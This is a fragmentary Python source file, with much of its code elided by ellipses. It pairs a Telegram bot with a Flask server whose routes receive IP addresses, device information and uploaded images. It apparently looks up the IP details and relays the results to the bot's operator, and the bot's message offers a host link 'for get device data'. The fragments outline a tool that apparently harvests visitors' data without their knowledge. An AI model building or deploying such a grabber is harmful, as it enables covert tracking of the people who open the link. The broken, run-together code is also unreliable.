...
def send_welcome(message):
    bot.reply_to(message, f"""
     ...
     {host} : for get device data like etc.ip, device info
...
@app.route('/data', methods=['POST', 'GET'])                          def upload_image():
...
def devi():
    data = request.get_json()                                             io = jdata(data)
...
def ip():                                                                 data = request.get_json()                                             hi = jdata(data)                                                      ip = data['ip']                                                       ha6 = jdata(ipdata(ip))
    m =f"""
    # ip addres data \n
    ```
    {ha6}
...
if __name__ == '__main__':
    ...
    bot_start = threading.Thread(target=Bot)
    bot_start.start()
